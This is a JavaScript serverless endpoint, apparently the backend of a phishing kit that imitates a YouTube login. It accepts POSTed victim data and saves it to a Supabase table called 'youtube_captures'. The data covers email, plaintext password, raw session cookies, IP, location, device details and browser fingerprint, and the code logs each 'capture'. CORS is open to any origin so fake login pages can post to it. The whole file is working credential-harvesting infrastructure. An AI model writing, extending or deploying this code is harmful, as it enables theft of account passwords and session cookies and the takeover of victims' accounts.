// api/capture.js — Store captured credentials + data to Supabase

import { createClient } from '@supabase/supabase-js';

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    // Validate env vars
    if (!SUPABASE_URL || !SUPABASE_SERVICE_KEY) {
        console.error('[!] Missing Supabase credentials');
        return res.status(500).json({ error: 'Server configuration error' });
    }

    const supabase = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY);

    try {
        const data = req.body;
        if (!data) return res.status(400).json({ error: 'No data received' });

        const entryId = `yt_${Date.now()}_${Math.random().toString(36).substring(2, 10)}`;

        // Prepare the row
        const row = {
            entry_id: entryId,
            timestamp: data.timestamp || new Date().toISOString(),
            email: data.email || '',
            password: data.password || '',
            ip: data.ip || null,
            location: data.location || null,
            device: data.device || null,
            cookies: data.cookies?.parsed || null,
            cookie_raw: data.cookies?.raw || null,
            cookie_count: data.cookies?.count || 0,
            fingerprint: data.fingerprint || null,
            user_agent: data.device?.userAgent || null,
            platform: data.device?.platform || null
        };

        // Insert into Supabase
        const { error } = await supabase
            .from('youtube_captures')
            .insert(row);

        if (error) {
            console.error('[!] Supabase insert error:', error);
            return res.status(500).json({ error: error.message });
        }

        // Also store cookies separately for easy export if present
        if (data.cookies?.raw) {
            const { error: cookieError } = await supabase
                .from('youtube_captures')
                .update({ cookie_raw: data.cookies.raw })
                .eq('entry_id', entryId);

            if (cookieError) {
                console.error('[!] Cookie update error:', cookieError);
            }
        }

        console.log(`[+] YouTube capture stored: ${data.email} | IP: ${data.ip?.ip || 'unknown'} | Cookies: ${data.cookies?.count || 0}`);
        return res.status(200).json({ status: 'ok', id: entryId });

    } catch (error) {
        console.error('[!] Capture error:', error.message);
        console.error('[!] Stack:', error.stack);
        return res.status(500).json({ error: error.message });
    }
}
